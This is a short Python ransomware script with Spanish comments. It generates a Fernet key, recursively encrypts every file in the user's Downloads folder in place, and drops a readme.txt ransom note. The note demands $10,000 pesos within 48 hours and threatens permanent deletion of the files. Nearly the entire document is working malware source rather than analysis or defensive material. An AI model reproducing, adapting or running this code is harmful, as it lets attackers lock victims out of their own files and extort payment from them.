from cryptography.fernet import Fernet
import os

def generarKey():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

def retornarKey():
    return open("key.key", "rb").read()

def encryp(items, key):
    i = Fernet(key)
    for x in items:
        try:
            with open(x, "rb") as file:
                file_data = file.read()
            data = i.encrypt(file_data)
            with open(x, "wb") as file:
                file.write(data)
        except PermissionError:
            print(f"No se pudo acceder a {x}, permiso denegado.")
        except Exception as e:
            print(f"Error en {x}: {e}")

def obtener_archivos_recursivamente(directorio):
    archivos = []
    for root, dirs, files in os.walk(directorio):
        for file in files:
            archivos.append(os.path.join(root, file))
    return archivos

if __name__ == "__main__":
    user_profile = os.getenv('USERPROFILE')
    archivos = os.path.join(user_profile, 'Downloads')
    
    # Obtener todos los archivos en el directorio y subdirectorios
    archivos_2 = obtener_archivos_recursivamente(archivos)

    generarKey()
    key = retornarKey()

    encryp(archivos_2, key)

    with open(os.path.join(archivos, "readme.txt"), "w") as file:
        file.write("TODOS SUS ARCHIVOS HAN SIDO ENCRIPTADOS.\n")
        file.write("PARA RECUPERARLOS, DEPOSITE $10,000 PESOS A LA SIGUIENTE CUENTA:\n")
        file.write("Cuenta: XXXXXXXXXX\n")
        file.write("SI NO REALIZA EL PAGO EN 48 HORAS, TODOS SUS ARCHIVOS SERÁN ELIMINADOS PERMANENTEMENTE.\n")
        file.write("NO INTENTE DESENCRIPTAR LOS ARCHIVOS POR SU CUENTA, CUALQUIER INTENTO FALLIDO RESULTARÁ EN LA PÉRDIDA PERMANENTE DE SUS DATOS.\n")
        file.write("ESTE ES SU ÚLTIMO AVISO.\n")
